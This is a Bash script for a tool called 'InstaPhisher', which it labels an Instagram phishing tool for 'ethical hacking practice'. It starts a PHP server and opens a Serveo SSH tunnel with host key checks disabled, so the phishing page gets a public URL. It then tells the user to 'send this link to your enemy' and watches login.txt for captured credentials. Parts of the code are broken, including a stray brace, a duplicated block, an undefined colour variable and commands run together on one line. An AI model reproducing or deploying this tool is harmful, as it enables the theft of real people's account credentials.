#!/bin/bash

# Colors
RED='\033[1;31m'
GRN='\033[1;32m'
CYAN='\033[1;36m'
NC='\033[0m'

# Clear screen
clear

# Colors
NC='\033[0m'
GRADIENT=( '\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m' )

# Install figlet and lolcat silently
pkg install figlet -y > /dev/null 2>&1
pkg install toilet -y > /dev/null 2>&1
pkg install ruby -y > /dev/null 2>&1
gem install lolcat > /dev/null 2>&1

# Typing animation function
type_effect() {
  text=$1
  delay=${2:-0.07}
  for ((i=0; i<${#text}; i++)); do
    printf "%s" "${text:$i:1}"
    sleep "$delay"
  done
  echo ""
}

# Print "InstaPhisher" big, one-line, animated
echo ""
figlet -f slant "InstaPhisher" | lolcat -a -d 4

# Define rainbow colors
COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m')
NC='\033[0m'  # No color

# Function for rainbow typing animation
rainbow_type() {
  text="$1"
  delay=${2:-0.03}
  color_index=0

  for ((i=0; i<${#text}; i++)); do
    char="${text:$i:1}"
    color="${COLORS[$color_index]}"
    echo -en "${color}${char}${NC}"
    sleep "$delay"
    ((color_index=(color_index+1)%${#COLORS[@]}))
  done
  echo ""
}

# Rainbow animated subtitle
rainbow_type "Instagram Phishing Tool for Ethical Hacking Practice" 0.03
rainbow_type "Created by: SACHIN BADASRA" 0.04
echo ""

# Colors
GRN='\033[0;32m'
NC='\033[0m'

# Check if requirements already installed
if [ -f "$HOME/.mytool_installed" ]; then
    echo -e "${GRN}[*] Requirements already installed. Skipping setup...${NC}"
else
    echo -e "${GRN}[+] Installing requirements...${NC}"
    
    pkg update -y > /dev/null 2>&1

    # Install PHP if not installed
    if ! command -v php > /dev/null 2>&1; then
        pkg install php -y > /dev/null 2>&1
    fi

    # Install OpenSSH if not installed
    if ! command -v ssh > /dev/null 2>&1; then
        pkg install openssh -y > /dev/null 2>&1
    fi

    # Install Git if not installed
    if ! command -v git > /dev/null 2>&1; then
        pkg install git -y > /dev/null 2>&1
    fi

    # Create a flag file to mark setup done
    touch "$HOME/.mytool_installed"
    echo -e "${GRN}[+] Requirements installation complete.${NC}"
fi

# Start PHP server
start_localhost() {
    echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}"
    php -S 127.0.0.1:8080 > /dev/null 2>&1 &
echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
tail -n 0 -f login.txt 2>/dev/null
}

start_serveo() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 &

sleep 1

echo -e "${GRN}[+] Starting Serveo tunnel...${NC}"
ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &

sleep 0.5

SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*\.serveo.net" serveo.log)

if [ ! -z "$SERVEO_URL" ]; then
    echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL ${NC}"
else
    echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}"
fi
}
    
#live credentials 

echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}"
echo -e "${CYAN}[@]Send this link to your enemy${NC}"
echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
tail -n 0 -f login.txt 2>/dev/null
}

# Menu
echo -e "${CYAN}Choose Port Forwarding Method:${NC}"
echo "1) Localhost (only for same device or network)"
echo "2) Serveo.net (public URL)"
read -p $'\n>> ' choice

if [ "$choice" == "1" ]; then
    start_localhost
elif [ "$choice" == "2" ]; then
    start_serveo
else
    echo -e "${RED}[!] Invalid option. Exiting.${NC}"
    exit 1
fi
